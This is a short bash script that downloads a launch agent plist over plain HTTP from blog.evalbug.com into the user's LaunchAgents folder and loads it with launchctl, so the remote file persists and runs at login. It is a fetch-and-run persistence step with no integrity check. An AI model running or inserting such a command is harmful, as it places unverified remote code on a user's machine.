#!/bin/bash
curl -so /Users/$USER/Library/LaunchAgents/evalbug.plist http://blog.evalbug.com/uploads/evalbug.plist
launchctl load /Users/$USER/Library/LaunchAgents/evalbug.plist
